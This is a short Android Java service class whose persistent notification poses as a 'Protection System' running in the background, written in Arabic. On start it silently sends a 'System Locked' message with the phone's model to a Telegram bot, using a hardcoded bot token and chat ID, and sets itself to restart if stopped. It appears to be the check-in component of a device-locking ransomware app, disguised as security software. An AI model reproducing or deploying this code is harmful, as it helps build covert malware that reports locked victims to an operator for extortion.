package com.example.app;

import android.app.*;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import java.net.HttpURLConnection;
import java.net.URL;

public class BgService extends Service {
    @Override
    public void onCreate() {
        super.onCreate();
        String CHANNEL = "ch";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(CHANNEL, "System", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(c);
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? new Notification.Builder(this, CHANNEL) : new Notification.Builder(this);
        startForeground(1, b.setContentTitle("نظام الحماية").setContentText("يعمل في الخلفية").setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build());

        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot8885955583:AAFB3gmzus0AJNLcRlDkZ8UsOWH_4DnManE/sendMessage?chat_id=7560932400&text=System Locked: " + Build.MODEL;
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.getOutputStream().flush();
            } catch (Exception e) {}
        }).start();
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
